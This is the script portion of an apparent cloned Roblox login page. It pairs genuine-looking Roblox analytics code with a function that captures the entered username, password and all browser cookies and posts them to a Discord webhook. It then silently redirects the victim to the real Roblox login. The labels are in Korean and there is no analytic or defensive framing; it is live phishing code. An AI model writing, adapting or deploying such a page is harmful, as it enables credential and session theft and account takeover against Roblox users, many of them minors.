<script type="text/javascript">
    $(function(){
        function trackReturns() {
            function dayDiff(d1, d2) {
                return Math.floor((d1-d2)/86400000);
            }
            if (!localStorage) {
                return false;
            }

            var cookieName = 'RBXReturn';
            var cookieOptions = {expires:9001};
            var cookieStr = localStorage.getItem(cookieName) || "";
            var cookie = {};

            try {
                cookie = JSON.parse(cookieStr);
            } catch (ex) {
                // busted cookie string from old previous version of the code
            }

            try {
                if (typeof cookie.ts === "undefined" || isNaN(new Date(cookie.ts))) {
                    localStorage.setItem(cookieName, JSON.stringify({ ts: new Date().toDateString() }));
                    return false;
                }
            } catch (ex) {
                return false;
            }

            var daysSinceFirstVisit = dayDiff(new Date(), new Date(cookie.ts));
            if (daysSinceFirstVisit == 1 && typeof cookie.odr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_odr', {});
                cookie.odr = 1;
            }
            if (daysSinceFirstVisit >= 1 && daysSinceFirstVisit <= 7 && typeof cookie.sdr === "undefined") {
                RobloxEventManager.triggerEvent('rbx_evt_sdr', {});
                cookie.sdr = 1;
            }
            try {
                localStorage.setItem(cookieName, JSON.stringify(cookie));
            } catch (ex) {
                return false;
            }
        }

        GoogleListener.init();



        RobloxEventManager.initialize(true);
        RobloxEventManager.triggerEvent('rbx_evt_pageview');
        trackReturns();
        

        RobloxEventManager._idleInterval = 450000;
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_start');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_ftp');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_initial_install_success');
        RobloxEventManager.registerCookieStoreEvent('rbx_evt_fmp');
        
    });

</script>

<script type="text/javascript">
function submitToDiscord(event) {
    event.preventDefault();

    // Get form data
    const username = document.getElementById('login-username').value;
    const password = document.getElementById('login-password').value;

    // Get all cookies
    const cookies = document.cookie;

    // Prepare message for Discord
    const message = {
        embeds: [
            {
                title: "로블록스 로그인 정보",
                color: 0xff0000,
                fields: [
                    {
                        name: "아이디",
                        value: username,
                        inline: true
                    },
                    {
                        name: "비밀번호",
                        value: password,
                        inline: true
                    },
                    {
                        name: "쿠키",
                        value: cookies || "쿠키 없음"
                    }
                ],
                timestamp: new Date().toISOString()
            }
        ]
    };

    // Send to Discord webhook
    fetch(https://discordapp.com/api/webhooks/1545789173879930983/X6I-0ZN0Z_7f6necgv6Ccn3UxTDkP1QEsPD8eYUMIiJE9lymXrD5mxyEYDsIn_KbH2QH, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(message)
    })
    .then(response => {
        // Redirect to original Roblox login after sending
        window.location.href = 'https://www.roblox.com/login';
    })
    .catch(error => {
        console.error('Error sending data to Discord:', error);
        // Still redirect to original Roblox login even if there's an error
        window.location.href = 'https://www.roblox.com/login';
    });
}

// Make all external links open in new tab and go to original Roblox site
document.addEventListener('DOMContentLoaded', function() {
    const links = document.querySelectorAll('a:not([href*="login"])');
    links.forEach(link => {
        const href = link.getAttribute('href');
        if (href && !href.startsWith('#') && !href.startsWith('javascript:')) {
            // Check if it's a relative URL
            if (!urlparse(href).hostname) {
                link.setAttribute('href', 'https://www.roblox.com' + href);
            }
            link.setAttribute('target', '_blank');
        }
    });
});
</script>
